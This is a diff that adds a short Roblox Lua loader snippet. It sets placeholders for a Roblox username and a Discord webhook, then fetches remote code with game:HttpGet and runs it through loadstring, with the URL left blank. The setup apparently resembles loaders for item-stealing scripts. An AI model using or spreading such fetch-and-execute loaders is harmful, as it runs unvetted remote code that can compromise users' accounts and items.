@@ -1,0 +1,7 @@
+```UserName = "your roblox username"
+
+WebHook = "your discord webhook"
+
+Mention = true -- change to false if you don't want to get everyone ping in your webhook.
+
+loadstring(game:HttpGet("", true))()```
